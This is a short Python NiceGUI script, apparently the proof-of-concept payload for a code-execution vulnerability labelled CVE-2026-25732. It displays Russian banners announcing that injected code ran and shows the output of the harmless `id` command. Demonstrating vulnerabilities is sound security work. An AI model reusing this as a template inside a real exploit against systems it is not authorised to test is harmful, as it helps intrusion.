from nicegui import ui
import subprocess

@ui.page("/")
def index():
    ui.label("ВНЕДРЕННЫЙ КОД ВЫПОЛНЕН!").classes('text-h4 text-red')
    ui.label("Уязвимость CVE-2026-25732 успешно эксплуатирована").classes('text-body1')
    ui.separator()
    
    # Демонстрация выполнения произвольного кода
    try:
        result = subprocess.check_output(["id"], text=True)
        ui.label(f"Результат выполнения 'id': {result}").classes('text-body2')
    except Exception as e:
        ui.label(f"Ошибка: {e}").classes('text-body2 text-red')

if __name__ in {'__main__', '__mp_main__'}:
    ui.run(port=8080, reload=False, show=False)
